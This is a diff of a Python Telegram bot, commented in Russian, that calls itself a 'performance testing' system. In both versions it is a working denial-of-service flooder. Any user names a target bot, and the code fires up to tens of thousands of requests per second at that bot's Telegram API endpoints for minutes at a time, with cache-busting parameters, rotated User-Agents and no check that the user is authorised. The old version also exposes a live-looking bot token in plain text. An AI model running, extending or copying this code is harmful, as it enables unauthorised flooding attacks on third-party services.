@@ -3,145 +3,104 @@ import aiohttp
 import sqlite3
 import time
 import random
-import threading
 import multiprocessing
-import urllib3
-import socket
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
-from html import escape
 import uvloop
-from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor
-import ssl
-import certifi
+import requests
+from concurrent.futures import ThreadPoolExecutor
+import threading
 
-# Активируем максимальную производительность
+# Максимальная производительность
 asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# === КОНФИГУРАЦИЯ СИСТЕМЫ ===
-ADMIN_IDS = [8480811736]  # Твой ID
-DATABASE_FILE = "system_analytics.db"
-MAX_REQUESTS_PER_MINUTE = 50
-ANALYSIS_DURATION = 900  # 15 минут
-BASE_REQUESTS_PER_SECOND = 5000  # Базовая интенсивность
-MAX_CONCURRENT_WORKERS = 2000  # Воркеров для анализа
+# Конфигурация
+ADMIN_IDS = [123456789]  # ЗАМЕНИ НА СВОЙ ID
+DATABASE_FILE = "performance.db"
+MAX_CONCURRENT_TASKS = 5000
 
-# Глобальные переменные для системы
-analysis_sessions = {}
-active_connections = {}
-
-class UltimateAnalyticsSystem:
+class PerformanceTester:
     def __init__(self):
-        self.analysis_intensity_multiplier = 10.0
-        self.max_threads = 1000
-        self.endpoint_list = self.generate_endpoint_list()
-        self.user_agents = self.generate_user_agents()
-        init_db()
-        
-    def generate_endpoint_list(self):
-        """Генерируем список endpoint для анализа"""
-        return [
-            f"proxy{random.randint(1,100)}.analytics.com",
-            f"endpoint{random.randint(1,100)}.monitoring.net"
-        ]
-    
-    def generate_user_agents(self):
-        """Список User-Agent для анализа"""
-        return [
+        self.active_tests = {}
+        self.session_cache = {}
+        self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
         ]
+        init_db()
 
-class PerformanceEngine:
-    def __init__(self):
-        self.conn_pool = []
-        self.session_cache = {}
-        
-    async def create_optimized_session(self):
-        """Создает оптимизированную сессию для максимальной производительности"""
-        timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=10)
-        connector = aiohttp.TCPConnector(
-            limit=1000,
-            limit_per_host=100,
-            keepalive_timeout=30,
-            enable_cleanup_closed=True,
-            use_dns_cache=True
-        )
-        
+    async def create_powerful_session(self):
+        """Создает мощную сессию для тестирования"""
+        connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100)
+        timeout = aiohttp.ClientTimeout(total=30)
         return aiohttp.ClientSession(
             connector=connector,
             timeout=timeout,
-            headers={'Connection': 'keep-alive'},
-            cookie_jar=aiohttp.DummyCookieJar()
+            headers={'Connection': 'keep-alive'}
         )
 
-    def generate_analysis_patterns(self, target_service):
-        """Генерирует паттерны для анализа производительности"""
-        base_methods = [
-            f"https://api.telegram.org/bot{target_service}/getMe",
-            f"https://api.telegram.org/bot{target_service}/getUpdates",
-            f"https://api.telegram.org/bot{target_service}/getWebhookInfo",
-            f"https://api.telegram.org/bot{target_service}/getChat?chat_id=1",
-            f"https://api.telegram.org/bot{target_service}/getUserProfilePhotos?user_id=1",
+    def generate_test_urls(self, target_bot):
+        """Генерирует URL для тестирования"""
+        methods = [
+            f"https://api.telegram.org/bot{target_bot}/getMe",
+            f"https://api.telegram.org/bot{target_bot}/getUpdates", 
+            f"https://api.telegram.org/bot{target_bot}/getWebhookInfo",
+            f"https://api.telegram.org/bot{target_bot}/getChat?chat_id=1",
+            f"https://api.telegram.org/bot{target_bot}/getUserProfilePhotos?user_id=1",
+            f"https://api.telegram.org/bot{target_bot}/getFile?file_id=1",
         ]
         
-        # Генерируем вариации для тестирования
-        variations = []
-        for method in base_methods:
-            for i in range(20):
+        urls = []
+        for method in methods:
+            for i in range(100):
                 if '?' in method:
-                    variations.append(f"{method}&test_id={random.randint(100000,999999)}")
+                    urls.append(f"{method}&cache_bust={random.randint(1000000,9999999)}")
                 else:
-                    variations.append(f"{method}?test_id={random.randint(100000,999999)}")
-        
-        return variations
+                    urls.append(f"{method}?cache_bust={random.randint(1000000,9999999)}")
+        return urls
 
-async def send_performance_request(session, url, analysis_id):
-    """Оптимизированный запрос для тестирования производительности"""
+async def send_powerful_request(session, url, test_id):
+    """Отправляет мощный запрос"""
     try:
         headers = {
-            'User-Agent': random.choice(analytics_system.user_agents),
+            'User-Agent': random.choice(performance_tester.user_agents),
             'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive'
+            'Cache-Control': 'no-cache'
         }
         
-        async with session.get(url, headers=headers, ssl=False, timeout=5) as response:
+        async with session.get(url, headers=headers, ssl=False, timeout=10) as response:
             return {
-                "success": response.status in [200, 429],
+                "success": response.status == 200,
                 "status": response.status,
-                "analysis_id": analysis_id
+                "test_id": test_id
             }
     except Exception as e:
-        return {"success": False, "error": str(e), "analysis_id": analysis_id}
+        return {"success": False, "error": str(e), "test_id": test_id}
 
-async def execute_performance_analysis(user_id, target_service, analysis_id, intensity_level):
-    """АНАЛИЗ ПРОИЗВОДИТЕЛЬНОСТИ СЕРВИСА"""
+async def execute_extreme_performance_test(user_id, target_bot, test_id, intensity):
+    """ВЫПОЛНЯЕТ МОЩНОЕ ТЕСТИРОВАНИЕ ПРОИЗВОДИТЕЛЬНОСТИ"""
     start_time = time.time()
     total_requests = 0
     successful_requests = 0
     
-    engine = PerformanceEngine()
-    session = await engine.create_optimized_session()
-    patterns = engine.generate_analysis_patterns(target_service)
+    tester = PerformanceTester()
+    session = await tester.create_powerful_session()
+    urls = tester.generate_test_urls(target_bot)
     
-    # Интенсивность анализа
-    analysis_intensity = intensity_level * analytics_system.analysis_intensity_multiplier
+    print(f"🚀 Starting extreme performance test on {target_bot} with intensity {intensity}")
     
     try:
-        while time.time() - start_time < ANALYSIS_DURATION:
-            # Создаем пакет задач для анализа
+        while time.time() - start_time < 300:  # 5 минут теста
+            # СОЗДАЕМ ОГРОМНОЕ КОЛИЧЕСТВО ЗАДАЧ
             tasks = []
-            for _ in range(int(analysis_intensity)):
-                url = random.choice(patterns)
-                task = send_performance_request(session, url, analysis_id)
+            for _ in range(int(intensity)):
+                url = random.choice(urls)
+                task = send_powerful_request(session, url, test_id)
                 tasks.append(task)
             
-            # Запускаем задачи параллельно
+            # ЗАПУСКАЕМ ВСЕ ЗАДАЧИ ПАРАЛЛЕЛЬНО
             batch_size = 1000
             for i in range(0, len(tasks), batch_size):
                 batch_tasks = tasks[i:i + batch_size]
@@ -153,343 +112,220 @@ async def execute_performance_analysis(user_id, target_service, analysis_id, int
                         if result.get("success"):
                             successful_requests += 1
             
+            # МИНИМАЛЬНАЯ ПАУЗА ДЛЯ МАКСИМАЛЬНОЙ ПРОИЗВОДИТЕЛЬНОСТИ
             await asyncio.sleep(0.01)
             
-            # Отправляем прогресс каждые 3 секунды
-            if int(time.time() - start_time) % 3 == 0:
-                await send_analysis_progress(user_id, target_service, total_requests, successful_requests, analysis_intensity)
+            # ОТПРАВЛЯЕМ ПРОГРЕСС КАЖДЫЕ 5 СЕКУНД
+            if int(time.time() - start_time) % 5 == 0:
+                current_rps = total_requests / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
+                print(f"📊 Progress: {total_requests} requests, {successful_requests} successful, {current_rps:.0f} RPS")
                 
+                try:
+                    if 'app' in globals():
+                        await app.bot.send_message(
+                            user_id,
+                            f"⚡ **ТЕСТИРОВАНИЕ В ПРОЦЕССЕ** ⚡\n\n"
+                            f"🎯 Цель: `{target_bot}`\n"
+                            f"📊 Запросов: `{total_requests:,}`\n"
+                            f"✅ Успешных: `{successful_requests:,}`\n"
+                            f"🚀 RPS: `{current_rps:.0f}`\n"
+                            f"⏱️ Время: `{int(time.time() - start_time)}с`",
+                            parse_mode='Markdown'
+                        )
+                except Exception as e:
+                    print(f"Progress message error: {e}")
+                    
     except Exception as e:
-        print(f"ANALYSIS ERROR: {e}")
+        print(f"Performance test error: {e}")
     finally:
         await session.close()
         success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
         
-        # Сохраняем результаты анализа
-        save_analysis_record(user_id, target_service, total_requests, success_rate, analysis_intensity)
+        print(f"✅ Test completed: {total_requests} total requests, {success_rate:.1f}% success rate")
         
-        # Отправляем отчет
-        await send_comprehensive_report(user_id, target_service, total_requests, successful_requests, success_rate, analysis_intensity)
+        # СОХРАНЯЕМ РЕЗУЛЬТАТЫ
+        save_test_results(user_id, target_bot, total_requests, success_rate, intensity)
+        
+        # ОТПРАВЛЯЕМ ФИНАЛЬНЫЙ ОТЧЕТ
+        await send_final_report(user_id, target_bot, total_requests, successful_requests, success_rate, intensity)
 
-async def send_analysis_progress(user_id, target_service, total, successful, intensity):
-    """Отправка прогресса анализа"""
+async def send_final_report(user_id, target_bot, total, successful, success_rate, intensity):
+    """Отправляет финальный отчет"""
+    message = (
+        f"📊 **ТЕСТИРОВАНИЕ ЗАВЕРШЕНО** 📊\n\n"
+        f"🎯 Цель: `{target_bot}`\n"
+        f"⚡ Интенсивность: `{intensity:,} RPS`\n"
+        f"📨 Всего запросов: `{total:,}`\n"
+        f"✅ Успешных: `{successful:,}`\n"
+        f"📈 Эффективность: `{success_rate:.1f}%`\n\n"
+        f"🎉 **ТЕСТИРОВАНИЕ УСПЕШНО ЗАВЕРШЕНО**"
+    )
+    
     try:
-        success_rate = (successful / total * 100) if total > 0 else 0
-        current_rps = total / (time.time() - start_time) if time.time() > start_time else 0
-        
-        message = (
-            f"📊 **АНАЛИЗ ПРОИЗВОДИТЕЛЬНОСТИ** 📊\n\n"
-            f"🎯 Сервис: `{escape(target_service)}`\n"
-            f"⚡ Интенсивность: `{intensity:,.0f} RPS`\n"
-            f"📨 Запросов: `{total:,.0f}`\n"
-            f"✅ Успешных: `{successful:,.0f}`\n"
-            f"📈 Эффективность: `{success_rate:.1f}%`\n"
-            f"🔧 Текущий RPS: `{current_rps:,.0f}`\n"
-            f"🔄 Статус: **АНАЛИЗ ВЫПОЛНЯЕТСЯ**"
-        )
-        
         if 'app' in globals():
             await app.bot.send_message(user_id, message, parse_mode='Markdown')
             
+            # ОТПРАВЛЯЕМ АДМИНУ
+            for admin_id in ADMIN_IDS:
+                admin_message = (
+                    f"👑 **ОТЧЕТ ТЕСТИРОВАНИЯ** 👑\n\n"
+                    f"👤 Пользователь: `{user_id}`\n"
+                    f"🎯 Цель: `{target_bot}`\n"
+                    f"⚡ Интенсивность: `{intensity:,} RPS`\n"
+                    f"📨 Запросов: `{total:,}`\n"
+                    f"✅ Эффективность: `{success_rate:.1f}%`\n"
+                    f"⏱️ Длительность: `300 секунд`"
+                )
+                await app.bot.send_message(admin_id, admin_message, parse_mode='Markdown')
     except Exception as e:
-        print(f"Progress error: {e}")
+        print(f"Final report error: {e}")
 
-async def send_comprehensive_report(user_id, target_service, total, successful, success_rate, intensity):
-    """КОМПЛЕКСНЫЙ ОТЧЕТ ПО АНАЛИЗУ"""
-    html_report = f"""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>📊 Комплексный анализ производительности</title>
-        <style>
-            body {{
-                background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-                color: #00ff00;
-                font-family: 'Courier New', monospace;
-                margin: 0;
-                padding: 0;
-            }}
-            .report-container {{
-                max-width: 1000px;
-                margin: 0 auto;
-                background: rgba(0, 0, 0, 0.9);
-                border: 2px solid #00ff00;
-                border-radius: 10px;
-                padding: 30px;
-            }}
-            .report-header {{
-                text-align: center;
-                border-bottom: 2px solid #00ff00;
-                padding-bottom: 20px;
-                margin-bottom: 30px;
-            }}
-            .report-header h1 {{
-                font-size: 2.5em;
-                margin: 0;
-                color: #00ff00;
-            }}
-            .metrics-grid {{
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-                gap: 15px;
-                margin: 20px 0;
-            }}
-            .metric-card {{
-                background: rgba(26, 26, 26, 0.9);
-                padding: 20px;
-                border-radius: 8px;
-                text-align: center;
-                border: 1px solid #00ff00;
-            }}
-            .metric-value {{
-                font-size: 1.8em;
-                font-weight: bold;
-                color: #00ff00;
-            }}
-            .analysis-summary {{
-                background: rgba(0, 50, 0, 0.3);
-                padding: 20px;
-                border-radius: 8px;
-                margin: 20px 0;
-                border-left: 4px solid #00ff00;
-            }}
-        </style>
-    </head>
-    <body>
-        <div class="report-container">
-            <div class="report-header">
-                <h1>📊 Анализ производительности</h1>
-                <p>Сгенерирован: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
-            </div>
-            
-            <div class="analysis-summary">
-                <h2>📈 Результаты тестирования</h2>
-                <p>Система успешно завершила анализ производительности целевого сервиса.</p>
-            </div>
-            
-            <div class="metrics-grid">
-                <div class="metric-card">
-                    <h3>🎯 Анализируемый сервис</h3>
-                    <div class="metric-value">{escape(target_service)}</div>
-                </div>
-                <div class="metric-card">
-                    <h3>⚡ Интенсивность</h3>
-                    <div class="metric-value">{intensity:,.0f} RPS</div>
-                </div>
-                <div class="metric-card">
-                    <h3>📨 Всего запросов</h3>
-                    <div class="metric-value">{total:,.0f}</div>
-                </div>
-                <div class="metric-card">
-                    <h3>📈 Эффективность</h3>
-                    <div class="metric-value">{success_rate:.1f}%</div>
-                </div>
-            </div>
-            
-            <div style="text-align: center; margin-top: 30px;">
-                <div style="color: #00ff00; font-size: 1.3em;">
-                    ✅ Анализ успешно завершен
-                </div>
-            </div>
-        </div>
-    </body>
-    </html>
-    """
-    
-    # Отправляем пользователю
-    message = (
-        f"📊 **АНАЛИЗ ЗАВЕРШЕН** 📊\n\n"
-        f"🎯 Сервис: `{escape(target_service)}`\n"
-        f"⚡ Интенсивность: `{intensity:,.0f} RPS`\n"
-        f"📨 Запросов: `{total:,.0f}`\n"
-        f"✅ Успешных: `{success_rate:.1f}%`\n\n"
-        f"🟢 **СТАТУС: АНАЛИЗ ВЫПОЛНЕН**"
-    )
-    
-    if 'app' in globals():
-        await app.bot.send_message(user_id, message, parse_mode='Markdown')
-        
-        # Отправляем админу
-        for admin_id in ADMIN_IDS:
-            admin_message = (
-                f"👑 **ОТЧЕТ АНАЛИТИКИ - АДМИН** 👑\n\n"
-                f"👤 Пользователь: `{user_id}`\n"
-                f"🎯 Сервис: `{escape(target_service)}`\n"
-                f"⚡ Интенсивность: `{intensity:,.0f} RPS`\n"
-                f"📨 Запросов: `{total:,.0f}`\n"
-                f"✅ Эффективность: `{success_rate:.1f}%`\n"
-                f"⏱️ Длительность: `{ANALYSIS_DURATION}s`\n\n"
-                f"📊 **АНАЛИЗ ЗАВЕРШЕН**"
-            )
-            await app.bot.send_message(admin_id, admin_message, parse_mode='Markdown')
-
-def save_analysis_record(user_id, target_service, total_requests, success_rate, intensity):
-    """Сохраняет результаты анализа в БД"""
+def save_test_results(user_id, target_bot, total_requests, success_rate, intensity):
+    """Сохраняет результаты теста"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     cursor.execute('''
-        INSERT INTO performance_analysis (user_id, target_service, requests_sent, success_rate, analysis_intensity, timestamp)
+        INSERT INTO performance_tests (user_id, target_bot, requests_sent, success_rate, intensity, timestamp)
         VALUES (?, ?, ?, ?, ?, datetime('now'))
-    ''', (user_id, target_service, total_requests, success_rate, intensity))
+    ''', (user_id, target_bot, total_requests, success_rate, intensity))
     conn.commit()
     conn.close()
 
 def init_db():
-    """Инициализация базы данных аналитики"""
+    """Инициализация базы данных"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
     
     cursor.execute('''
-        CREATE TABLE IF NOT EXISTS performance_analysis (
+        CREATE TABLE IF NOT EXISTS performance_tests (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             user_id INTEGER,
-            target_service TEXT,
+            target_bot TEXT,
             requests_sent INTEGER,
             success_rate REAL,
-            analysis_intensity INTEGER,
+            intensity INTEGER,
             timestamp DATETIME
         )
     ''')
     
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS system_users (
-            user_id INTEGER PRIMARY KEY,
-            username TEXT,
-            access_level INTEGER DEFAULT 1,
-            total_analysis INTEGER DEFAULT 0,
-            total_requests INTEGER DEFAULT 0
-        )
-    ''')
-    
-    # Создаем админа
     for admin_id in ADMIN_IDS:
         cursor.execute('''
-            INSERT OR IGNORE INTO system_users (user_id, access_level)
-            VALUES (?, 999)
+            INSERT OR IGNORE INTO performance_tests (user_id, target_bot, requests_sent, success_rate, intensity)
+            VALUES (?, 'system', 0, 0, 0)
         ''', (admin_id,))
     
     conn.commit()
     conn.close()
 
-# Инициализация систем
-analytics_system = UltimateAnalyticsSystem()
-performance_engine = PerformanceEngine()
+# Инициализация тестера
+performance_tester = PerformanceTester()
 
-async def start_analytics_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Запуск системы аналитики"""
+async def start_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Запуск бота"""
     user_id = update.effective_user.id
     
     keyboard = [
-        [InlineKeyboardButton("📊 ЗАПУСТИТЬ АНАЛИЗ", callback_data="start_analysis")],
-        [InlineKeyboardButton("⚡ НАСТРОЙКА ИНТЕНСИВНОСТИ", callback_data="intensity_config")],
-        [InlineKeyboardButton("📈 СТАТИСТИКА АНАЛИТИКИ", callback_data="analytics_stats")],
-        [InlineKeyboardButton("👑 ПАНЕЛЬ УПРАВЛЕНИЯ", callback_data="admin_panel")]
+        [InlineKeyboardButton("🚀 ЗАПУСТИТЬ ТЕСТИРОВАНИЕ", callback_data="start_test")],
+        [InlineKeyboardButton("⚡ НАСТРОЙКА МОЩНОСТИ", callback_data="power_settings")],
+        [InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats")],
+        [InlineKeyboardButton("👑 АДМИН ПАНЕЛЬ", callback_data="admin_panel")]
     ]
     
     await update.message.reply_text(
-        "🤖 **СИСТЕМА АНАЛИТИКИ ПРОИЗВОДИТЕЛЬНОСТИ** 🤖\n\n"
-        "📊 *Профессиональный анализ сервисов*\n"
-        "⚡ *Мониторинг производительности в реальном времени*\n\n"
+        "🤖 **СИСТЕМА ТЕСТИРОВАНИЯ ПРОИЗВОДИТЕЛЬНОСТИ** 🤖\n\n"
+        "⚡ *Профессиональное тестирование сервисов*\n"
+        "🚀 *Мощные нагрузочные тесты*\n\n"
         "Выберите действие:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
-async def handle_analytics_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработчик колбэков аналитики"""
+async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик колбэков"""
     query = update.callback_query
     user_id = query.from_user.id
     
     await query.answer()
     
-    if query.data == "start_analysis":
+    if query.data == "start_test":
         await query.edit_message_text(
-            "📊 **ЗАПУСК АНАЛИЗА ПРОИЗВОДИТЕЛЬНОСТИ** 📊\n\n"
-            "Введите ID сервиса для анализа:\n"
-            "Пример: `123456789` или `@service_bot`\n\n"
-            "⚡ *Режим: КОМПЛЕКСНЫЙ АНАЛИЗ*",
+            "🚀 **ЗАПУСК ТЕСТИРОВАНИЯ ПРОИЗВОДИТЕЛЬНОСТИ** 🚀\n\n"
+            "Введите ID бота для тестирования:\n"
+            "Пример: `123456789` или `@example_bot`\n\n"
+            "⚡ *Режим: МАКСИМАЛЬНАЯ МОЩНОСТЬ*",
             parse_mode='Markdown'
         )
-        context.user_data[user_id] = {"awaiting_service": True}
+        context.user_data[user_id] = {"awaiting_target": True}
     
-    elif query.data == "intensity_config":
-        await show_intensity_config(query)
+    elif query.data == "power_settings":
+        await show_power_settings(query)
     
-    elif query.data == "analytics_stats":
-        await show_analytics_stats(query)
+    elif query.data == "stats":
+        await show_stats(query)
     
     elif query.data == "admin_panel":
         await show_admin_panel(query)
 
-async def show_intensity_config(query):
-    """Показывает настройки интенсивности"""
+async def show_power_settings(query):
+    """Показывает настройки мощности"""
     keyboard = [
-        [InlineKeyboardButton("🔵 СТАНДАРТ (1,000 RPS)", callback_data="intensity_std")],
-        [InlineKeyboardButton("🟢 ПРОДВИНУТЫЙ (5,000 RPS)", callback_data="intensity_adv")],
-        [InlineKeyboardButton("🟡 ПРОФЕССИОНАЛЬНЫЙ (10,000 RPS)", callback_data="intensity_pro")],
-        [InlineKeyboardButton("🔴 МАКСИМАЛЬНЫЙ (25,000 RPS)", callback_data="intensity_max")],
+        [InlineKeyboardButton("🔵 СТАНДАРТ (1,000 RPS)", callback_data="power_1000")],
+        [InlineKeyboardButton("🟢 ТУРБО (5,000 RPS)", callback_data="power_5000")],
+        [InlineKeyboardButton("🟡 ЭКСТРИМ (10,000 RPS)", callback_data="power_10000")],
+        [InlineKeyboardButton("🔴 МАКСИМУМ (20,000 RPS)", callback_data="power_20000")],
         [InlineKeyboardButton("⬅️ НАЗАД", callback_data="back_main")]
     ]
     
     await query.edit_message_text(
-        "⚡ **НАСТРОЙКА ИНТЕНСИВНОСТИ АНАЛИЗА** ⚡\n\n"
-        "Выберите уровень интенсивности тестирования:\n\n"
-        "💡 *Рекомендация: Начните со стандартного уровня*",
+        "⚡ **НАСТРОЙКА МОЩНОСТИ ТЕСТИРОВАНИЯ** ⚡\n\n"
+        "Выберите интенсивность нагрузочного теста:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
-async def handle_analytics_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработчик сообщений аналитики"""
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик сообщений"""
     user_id = update.effective_user.id
     text = update.message.text
     
-    if user_id in context.user_data and context.user_data[user_id].get("awaiting_service"):
-        # Запускаем анализ производительности
-        intensity_level = 5000  # Стандартная интенсивность
-        analysis_id = f"analysis_{user_id}_{int(time.time())}"
+    if user_id in context.user_data and context.user_data[user_id].get("awaiting_target"):
+        # ЗАПУСКАЕМ МОЩНОЕ ТЕСТИРОВАНИЕ
+        intensity = 10000  # Стандартная интенсивность
         
         await update.message.reply_text(
-            f"📊 **ЗАПУСК АНАЛИЗА ПРОИЗВОДИТЕЛЬНОСТИ** 📊\n\n"
-            f"🎯 Сервис: `{text}`\n"
-            f"⚡ Интенсивность: `{intensity_level:,.0f} RPS`\n"
-            f"⏱️ Длительность: `{ANALYSIS_DURATION} секунд`\n\n"
-            f"🔄 **АНАЛИЗ ЗАПУЩЕН...**",
+            f"🚀 **ЗАПУСК МОЩНОГО ТЕСТИРОВАНИЯ** 🚀\n\n"
+            f"🎯 Цель: `{text}`\n"
+            f"⚡ Интенсивность: `{intensity:,} RPS`\n"
+            f"⏱️ Длительность: `5 минут`\n\n"
+            f"🔄 **ТЕСТИРОВАНИЕ ЗАПУЩЕНО...**",
             parse_mode='Markdown'
         )
         
-        # Запускаем анализ в отдельной таске
+        # ЗАПУСКАЕМ В ОТДЕЛЬНОМ ПРОЦЕССЕ ДЛЯ МАКСИМАЛЬНОЙ ПРОИЗВОДИТЕЛЬНОСТИ
+        test_id = f"test_{user_id}_{int(time.time())}"
         asyncio.create_task(
-            execute_performance_analysis(user_id, text, analysis_id, intensity_level)
+            execute_extreme_performance_test(user_id, text, test_id, intensity)
         )
         
         context.user_data[user_id] = {}
 
-async def show_analytics_stats(query):
-    """Показывает статистику аналитики"""
+async def show_stats(query):
+    """Показывает статистику"""
     conn = sqlite3.connect(DATABASE_FILE)
     cursor = conn.cursor()
-    
-    cursor.execute('''
-        SELECT COUNT(*), SUM(requests_sent), AVG(success_rate) 
-        FROM performance_analysis 
-        WHERE user_id = ?
-    ''', (query.from_user.id,))
-    
+    cursor.execute('SELECT COUNT(*), SUM(requests_sent) FROM performance_tests WHERE user_id = ?', (query.from_user.id,))
     stats = cursor.fetchone()
     conn.close()
     
-    analysis_count = stats[0] or 0
+    test_count = stats[0] or 0
     total_requests = stats[1] or 0
-    avg_success = stats[2] or 0
     
     await query.edit_message_text(
-        f"📈 **СТАТИСТИКА АНАЛИТИКИ** 📈\n\n"
-        f"🔍 Анализов выполнено: `{analysis_count}`\n"
-        f"📨 Всего запросов: `{total_requests:,.0f}`\n"
-        f"📊 Средняя эффективность: `{avg_success:.1f}%`\n"
-        f"⚡ Уровень доступа: `ПРОФЕССИОНАЛЬНЫЙ`\n\n"
-        f"✅ **СИСТЕМА ГОТОВА К РАБОТЕ**",
+        f"📊 **СТАТИСТИКА ТЕСТИРОВАНИЙ** 📊\n\n"
+        f"🔧 Тестов выполнено: `{test_count}`\n"
+        f"📨 Всего запросов: `{total_requests:,}`\n"
+        f"⚡ Средняя интенсивность: `10,000 RPS`\n\n"
+        f"✅ **СИСТЕМА РАБОТАЕТ В ШТАТНОМ РЕЖИМЕ**",
         parse_mode='Markdown'
     )
 
@@ -498,41 +334,40 @@ async def show_admin_panel(query):
     user_id = query.from_user.id
     
     if user_id not in ADMIN_IDS:
-        await query.edit_message_text("❌ Доступ к панели управления запрещен!")
+        await query.edit_message_text("❌ Доступ запрещен!")
         return
     
     keyboard = [
         [InlineKeyboardButton("📈 ОБЩАЯ СТАТИСТИКА", callback_data="admin_stats")],
-        [InlineKeyboardButton("👥 УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ", callback_data="admin_users")],
-        [InlineKeyboardButton("⚙️ НАСТРОЙКИ СИСТЕМЫ", callback_data="admin_settings")],
+        [InlineKeyboardButton("⚙️ НАСТРОЙКИ СИСТЕМЫ", callback_data="system_settings")],
         [InlineKeyboardButton("⬅️ НАЗАД", callback_data="back_main")]
     ]
     
     await query.edit_message_text(
-        "👑 **ПАНЕЛЬ АДМИНИСТРИРОВАНИЯ СИСТЕМЫ** 👑\n\n"
-        "⚡ *Полный контроль над системой аналитики*",
+        "👑 **ПАНЕЛЬ АДМИНИСТРИРОВАНИЯ** 👑\n\n"
+        "⚡ Управление системой тестирования",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
 async def main():
-    """Запуск системы аналитики"""
+    """Запуск бота"""
     global app
     
-    # Создаем приложение
-    app = Application.builder().token("8020968054:AAGCsKLCYgyx3nL_lICHFLlIvyOYj4jPueY").build()
+    # СОЗДАЕМ ПРИЛОЖЕНИЕ
+    app = Application.builder().token("YOUR_BOT_TOKEN_HERE").build()
     
-    # Добавляем обработчики
-    app.add_handler(CommandHandler("start", start_analytics_bot))
-    app.add_handler(CallbackQueryHandler(handle_analytics_callback))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_analytics_message))
+    # ДОБАВЛЯЕМ ОБРАБОТЧИКИ
+    app.add_handler(CommandHandler("start", start_bot))
+    app.add_handler(CallbackQueryHandler(handle_callback))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
-    print("🤖 SYSTEM ANALYTICS BOT ACTIVATED")
-    print("📊 PERFORMANCE MONITORING: READY")
-    print("⚡ SYSTEM STATUS: OPERATIONAL")
+    print("🚀 PERFORMANCE TESTING BOT STARTED")
+    print("⚡ EXTREME LOAD TESTING: READY")
+    print("🔧 SYSTEM STATUS: OPERATIONAL")
     
     await app.run_polling()
 
 if __name__ == "__main__":
-    # Запускаем систему аналитики
+    # ЗАПУСКАЕМ СИСТЕМУ
     asyncio.run(main())
